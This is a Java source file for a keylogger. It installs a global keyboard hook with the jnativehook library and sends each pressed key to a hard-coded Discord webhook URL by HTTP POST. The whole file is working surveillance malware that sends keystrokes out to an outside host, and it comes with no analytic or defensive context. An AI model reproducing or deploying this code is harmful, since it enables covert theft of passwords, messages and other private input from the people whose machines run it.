package haemanth;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class KeyLogger implements NativeKeyListener {

    public static void main(String args[]){
        try{
            GlobalScreen.registerNativeHook();
        }catch(NativeHookException e){
            e.printStackTrace();

        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        hook("'''" + NativeKeyEvent.getKeyText(e.getKeyCode()) + "'''");

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    private static void hook(String key){
        PrintWriter out=null;
        BufferedReader in=null;
        StringBuilder vysledok = new StringBuilder();
        try{
            String url="https://discord.com/api/webhooks/1165927442205130822/lp5LlLpUoECjdIyn3Ty7D8v0-ovZlTJFl2kK6Ybn3ZfGfSPn1Q0FVRnygcAdXQVp_53X";
            URL kokot = new URL(url);
            URLConnection conn = kokot.openConnection();
            conn.setRequestProperty("accept","*/*");
            conn.setRequestProperty("connection","keep-alive");
            conn.setRequestProperty("user-agent","Keylogger");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String post = URLEncoder.encode("content", "UTF-8")+ "=" + URLEncoder.encode(key, "UTF-8");
            out.print(post);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null){
                vysledok.append("/n").append(line);

            }

        }catch(Exception e){
            e.printStackTrace();

        }finally {
            try{
                if(out != null){
                    out.close();
                }
                if(in != null){
                    out.close();
                }

            }catch(Exception ex){
                ex.printStackTrace();

            }
        }
        System.out.println(vysledok.toString());
    }
}
